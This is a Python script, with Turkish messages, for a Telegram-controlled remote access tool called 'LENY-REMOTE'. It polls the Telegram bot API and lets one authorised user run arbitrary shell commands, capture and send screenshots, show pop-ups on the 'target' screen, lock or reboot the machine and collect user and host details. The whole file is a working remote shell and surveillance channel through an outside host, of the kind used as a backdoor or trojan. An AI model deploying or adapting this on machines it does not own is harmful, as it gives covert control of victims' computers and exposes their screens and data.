import os
import sys
import subprocess
import time
import requests
import ctypes
import getpass
import threading
from io import BytesIO

try:
    import pyautogui
    HAS_GUI = True
except ImportError:
    HAS_GUI = False

# --- ÖZEL YAPILANDIRMA ---
TOKEN = "BURAYA_TELEGRAM_BOT_TOKENINI_YAZ"
AUTHORIZED_USER_ID = 123456789  # Kendi Telegram User ID'ni buraya yaz

def send_message(chat_id, text):
    url = f"https://api.telegram.org/bot{TOKEN}/sendMessage"
    payload = {"chat_id": chat_id, "text": text, "parse_mode": "Markdown"}
    try:
        requests.post(url, json=payload, timeout=5)
    except:
        pass

def send_photo(chat_id, photo_bytes, caption=""):
    url = f"https://api.telegram.org/bot{TOKEN}/sendPhoto"
    files = {"photo": ("snapshot.png", photo_bytes, "image/png")}
    data = {"chat_id": chat_id, "caption": caption}
    try:
        requests.post(url, data=data, files=files, timeout=10)
    except:
        pass

def handle_command(text, chat_id):
    text = text.strip()
    
    if text == "/start" or text.lower() == "menu":
        msg = (
            "🛡️ *LENY-REMOTE KONTROL MERKEZİ* 🛡️\n\n"
            "Sistem aktif ve operasyona hazır:\n"
            "• `/screenshot` - Anlık ekran görüntüsü al\n"
            "• `/cmd <komut>` - Uzaktan Shell komutu çalıştır\n"
            "• `/msg <mesaj>` - Hedef ekrana pop-up uyarı kutusu fırlat\n"
            "• `/lock` - Bilgisayarı anında kilitle\n"
            "• `/reboot` - Sistemi yeniden başlat\n"
            "• `/sysinfo` - Sistem durumunu göster\n"
        )
        send_message(chat_id, msg)
        
    elif text == "/screenshot":
        if HAS_GUI:
            try:
                screenshot = pyautogui.screenshot()
                bio = BytesIO()
                screenshot.save(bio, format='PNG')
                bio.seek(0)
                send_photo(chat_id, bio.read(), caption="📸 *LENY-REMOTE:* Anlık Görüntü Yakalandı")
            except Exception as e:
                send_message(chat_id, f"❌ Ekran görüntüsü alınamadı: {str(e)}")
        else:
            send_message(chat_id, "❌ Gerekli ekran kütüphanesi eksik.")
            
    elif text.startswith("/cmd "):
        cmd = text[5:].strip()
        try:
            output = subprocess.check_output(cmd, shell=True, stderr=subprocess.STDOUT, timeout=15)
            result = output.decode('utf-8', errors='ignore')
            if len(result) > 4000:
                result = result[:3996] + "\n..."
            if not result.strip():
                result = "[✔] Komut başarıyla yürütüldü (Geri dönüş çıktısı yok)."
            send_message(chat_id, f"💻 *Komut Çıktısı*:\n```\n{result}\n```")
        except Exception as e:
            send_message(chat_id, f"❌ Komut yürütme hatası: {str(e)}")

    elif text.startswith("/msg "):
        msg_content = text[5:].strip()
        if HAS_GUI:
            try:
                # Arka planda ana akışı dondurmadan ekrana pop-up mesaj kutusu fırlatır
                def show_alert():
                    pyautogui.alert(text=msg_content, title="LENY-REMOTE SYSTEM NOTICE")
                threading.Thread(target=show_alert).start()
                send_message(chat_id, f"💬 *Başarılı:* Hedef ekrana mesaj fırlatıldı: `{msg_content}`")
            except Exception as e:
                send_message(chat_id, f"❌ Mesaj gösterilemedi: {str(e)}")
        else:
            send_message(chat_id, "❌ GUI kütüphanesi aktif değil.")
            
    elif text == "/lock":
        try:
            if os.name == 'nt':
                ctypes.windll.user32.LockWorkStation()
            else:
                subprocess.run(["loginctl", "lock-session"], check=False)
            send_message(chat_id, "🔒 Bilgisayar kilitlendi.")
        except Exception as e:
            send_message(chat_id, f"❌ Kilitleme hatası: {str(e)}")

    elif text == "/reboot":
        try:
            send_message(chat_id, "🔄 Sistem yeniden başlatılıyor...")
            if os.name == 'nt':
                os.system("shutdown /r /t 1")
            else:
                os.system("sudo reboot")
        except Exception as e:
            send_message(chat_id, f"❌ Yeniden başlatma hatası: {str(e)}")
            
    elif text == "/sysinfo":
        try:
            user = getpass.getuser()
            hostname = os.environ.get('HOSTNAME', os.environ.get('COMPUTERNAME', 'Bilinmiyor'))
            os_info = sys.platform
            info = f"💻 *Sistem Durumu*\n• Kullanıcı: `{user}`\n• Makine: `{hostname}`\n• Platform: `{os_info}`"
            send_message(chat_id, info)
        except Exception as e:
            send_message(chat_id, f"❌ Bilgi alınamadı: {str(e)}")
            
    else:
        send_message(chat_id, "❓ Geçersiz komut. Menü için `/start` yaz.")

def main_loop():
    offset = 0
    while True:
        try:
            url = f"https://api.telegram.org/bot{TOKEN}/getUpdates?offset={offset}&timeout=30"
            response = requests.get(url, timeout=35)
            if response.status_code == 200:
                data = response.json()
                for result in data.get("result", []):
                    offset = result["update_id"] + 1
                    message = result.get("message")
                    if message:
                        chat_id = message["chat"]["id"]
                        user_id = message["from"]["id"]
                        text = message.get("text", "")
                        
                        if user_id == AUTHORIZED_USER_ID:
                            handle_command(text, chat_id)
                        else:
                            send_message(chat_id, "⛔ Bu sistemi kontrol etme yetkin yok.")
        except Exception:
            time.sleep(5)

if __name__ == "__main__":
    main_loop()
